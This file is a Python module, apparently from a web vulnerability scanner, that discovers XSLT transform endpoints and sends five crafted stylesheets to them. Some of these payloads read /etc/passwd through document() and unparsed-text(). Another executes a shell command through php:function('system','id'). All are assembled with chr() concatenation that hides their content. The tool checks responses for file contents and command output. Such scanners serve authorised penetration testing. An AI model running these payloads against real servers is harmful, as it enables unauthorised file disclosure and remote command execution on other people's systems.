"""xslt_injection v2 — XSLT processor RCE / data disclosure."""
from urllib.parse import urlparse
from core.http import HttpClient
from core.verify import confidence, is_signal

XSLT_NS = "xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\""

XSLT_PATHS = [
    "/xslt", "/xslt/transform", "/transform", "/xml/transform",
    "/xml/xslt", "/api/xslt", "/api/transform", "/api/v1/xslt",
    "/api/v1/transform", "/xslt/apply", "/apply",
    "/xml/convert", "/convert/xml", "/convert",
]

XSLT_MARKERS = [
    "XSLTProcessor",
    "javax.xml.transform.TransformerException",
    "XSLT processing error",
    "Xalan", "libxslt", "MSXML", "Saxon-HE",
    "Cannot find external function",
    "root:x:0:0:root", "daemon:x:1:1",
    "uid=", "gid=",
]


def _math_payload():
    return (
        chr(60) + "?xml version=" + chr(34) + "1.0" + chr(34) + "?>" + chr(62) + chr(10)
        + chr(60) + "xsl:stylesheet version=" + chr(34) + "1.0" + chr(34) + " " + XSLT_NS + chr(62) + chr(10)
        + chr(60) + "xsl:template match=" + chr(34) + "/" + chr(34) + chr(62) + chr(10)
        + chr(60) + "r" + chr(62) + chr(60) + "xsl:value-of select=" + chr(34) + "7*7" + chr(34) + "/" + chr(62) + chr(60) + "/r" + chr(62) + chr(10)
        + chr(60) + "/xsl:template" + chr(62) + chr(10)
        + chr(60) + "/xsl:stylesheet" + chr(62)
    )


def _system_property_payload():
    return (
        chr(60) + "?xml version=" + chr(34) + "1.0" + chr(34) + "?>" + chr(62) + chr(10)
        + chr(60) + "xsl:stylesheet version=" + chr(34) + "1.0" + chr(34) + " " + XSLT_NS + chr(62) + chr(10)
        + chr(60) + "xsl:template match=" + chr(34) + "/" + chr(34) + chr(62) + chr(10)
        + chr(60) + "v" + chr(62) + chr(60) + "xsl:value-of select=" + chr(34) + "system-property(&apos;xsl:version&apos;)" + chr(34) + "/" + chr(62) + chr(60) + "/v" + chr(62) + chr(10)
        + chr(60) + "/xsl:template" + chr(62) + chr(10)
        + chr(60) + "/xsl:stylesheet" + chr(62)
    )


def _document_read_payload():
    return (
        chr(60) + "?xml version=" + chr(34) + "1.0" + chr(34) + "?>" + chr(62) + chr(10)
        + chr(60) + "xsl:stylesheet version=" + chr(34) + "1.0" + chr(34) + " " + XSLT_NS + chr(62) + chr(10)
        + chr(60) + "xsl:template match=" + chr(34) + "/" + chr(34) + chr(62) + chr(10)
        + chr(60) + "r" + chr(62) + chr(60) + "xsl:value-of select=" + chr(34) + "document(&apos;/etc/passwd&apos;)" + chr(34) + "/" + chr(62) + chr(60) + "/r" + chr(62) + chr(10)
        + chr(60) + "/xsl:template" + chr(62) + chr(10)
        + chr(60) + "/xsl:stylesheet" + chr(62)
    )


def _saxon_unparsed_payload():
    return (
        chr(60) + "?xml version=" + chr(34) + "1.0" + chr(34) + "?>" + chr(62) + chr(10)
        + chr(60) + "xsl:stylesheet version=" + chr(34) + "2.0" + chr(34) + " xmlns:xsl=" + chr(34) + "http://www.w3.org/1999/XSL/Transform" + chr(34) + chr(62) + chr(10)
        + chr(60) + "xsl:template match=" + chr(34) + "/" + chr(34) + chr(62) + chr(10)
        + chr(60) + "r" + chr(62) + chr(60) + "xsl:value-of select=" + chr(34) + "unparsed-text(&apos;/etc/passwd&apos;)" + chr(34) + "/" + chr(62) + chr(60) + "/r" + chr(62) + chr(10)
        + chr(60) + "/xsl:template" + chr(62) + chr(10)
        + chr(60) + "/xsl:stylesheet" + chr(62)
    )


def _php_function_payload():
    return (
        chr(60) + "?xml version=" + chr(34) + "1.0" + chr(34) + "?>" + chr(62) + chr(10)
        + chr(60) + "xsl:stylesheet version=" + chr(34) + "1.0" + chr(34) + " " + XSLT_NS + " xmlns:php=" + chr(34) + "http://php.net/xsl" + chr(34) + chr(62) + chr(10)
        + chr(60) + "xsl:template match=" + chr(34) + "/" + chr(34) + chr(62) + chr(10)
        + chr(60) + "r" + chr(62) + chr(60) + "xsl:value-of select=" + chr(34) + "php:function(&apos;system&apos;,&apos;id&apos;)" + chr(34) + "/" + chr(62) + chr(60) + "/r" + chr(62) + chr(10)
        + chr(60) + "/xsl:template" + chr(62) + chr(10)
        + chr(60) + "/xsl:stylesheet" + chr(62)
    )


PAYLOADS = [
    ("math_check",       _math_payload,            ["49", ">49<"],         "critical"),
    ("system_property",  _system_property_payload, ["1.0", "2.0"],         "high"),
    ("document_read",    _document_read_payload,   ["root:x:0:0", "root:"], "critical"),
    ("saxon_unparsed",   _saxon_unparsed_payload,  ["root:x:0:0", "root:"], "critical"),
    ("php_function",     _php_function_payload,    ["uid=", "gid="],        "critical"),
]


_BASELINE_CACHE = {"text": ""}


def _check_result(body, expected_list):
    if not body:
        return None
    body_low = body.lower()
    baseline_low = _BASELINE_CACHE["text"].lower()
    for expected in expected_list:
        el = expected.lower()
        if el in baseline_low:
            continue
        idx = body_low.find(el)
        if idx == -1:
            continue
        context = body[max(0, idx - 50): idx + len(expected) + 50]
        ctx_low = context.lower()
        if "xsl:" in ctx_low and "select" in ctx_low:
            continue
        if "<?xml" in ctx_low and "xsl:stylesheet" in ctx_low:
            continue
        return expected
    return None


class XsltInjection:
    def run(self, session, logger):
        target = session.target
        u = urlparse(target)
        base = u.scheme + "://" + u.netloc
        http = HttpClient(session, logger)
        print("[xslt v2] target: " + base)
        try:
            base_r = http.get(base)
            baseline_text = (base_r.text or "") if base_r else ""
            _BASELINE_CACHE["text"] = baseline_text
            _BASELINE_CACHE["text"] = baseline_text
            _BASELINE_CACHE["text"] = baseline_text
        except Exception:
            baseline_text = ""
        active_markers = [m for m in XSLT_MARKERS if m.lower() not in baseline_text.lower()]
        print("[xslt v2] " + str(len(active_markers)) + "/" + str(len(XSLT_MARKERS)) + " markers active")
        findings = []
        print()
        print("[xslt v2] Phase 1: discovery (" + str(len(XSLT_PATHS)) + " paths)")
        live_paths = []
        for path in XSLT_PATHS:
            url = base + path
            try:
                r = http.post(url, data="xml", headers={"Content-Type": "application/xml"}, allow_redirects=False)
            except Exception:
                continue
            if r and r.status_code not in (404, 410):
                live_paths.append(path)
                print("  live: " + path + " (" + str(r.status_code) + ")")
        targets = [target] + [base + p for p in live_paths]
        print()
        print("[xslt v2] Phase 2: attack payloads")
        for endpoint in targets:
            for name, payload_fn, expected_list, sev in PAYLOADS:
                payload = payload_fn()
                try:
                    r = http.post(endpoint, data=payload, headers={"Content-Type": "application/xml"}, allow_redirects=False)
                except Exception:
                    continue
                if not r:
                    continue
                body = r.text or ""
                hit = _check_result(body, expected_list)
                if not hit:
                    body_low = body.lower()
                    for m in active_markers:
                        if m.lower() in body_low:
                            hit = m
                            break
                if not hit:
                    continue
                try:
                    r2 = http.post(endpoint, data=payload, headers={"Content-Type": "application/xml"}, allow_redirects=False)
                except Exception:
                    r2 = None
                if not r2:
                    continue
                hit2 = _check_result(r2.text or "", expected_list)
                if not hit2:
                    body_low2 = (r2.text or "").lower()
                    if not any(m.lower() in body_low2 for m in active_markers):
                        continue
                strength = 0.95 if ("root:" in str(hit) or "uid=" in str(hit)) else 0.85
                conf = confidence(strength, 1.0)
                if not is_signal(conf, floor=0.55, module="xslt"):
                    continue
                findings.append({
                    "type": "xslt_injection",
                    "severity": sev,
                    "endpoint": endpoint,
                    "payload_name": name,
                    "marker": str(hit)[:60],
                    "verify_hits": 2,
                    "confidence": conf,
                })
                print("  XSLT " + name + " at " + endpoint)
                logger.finding("xslt", sev, endpoint + " " + name)
                break
        print()
        print("[xslt v2] findings: " + str(len(findings)))
        return {"findings": findings, "live_paths": live_paths}
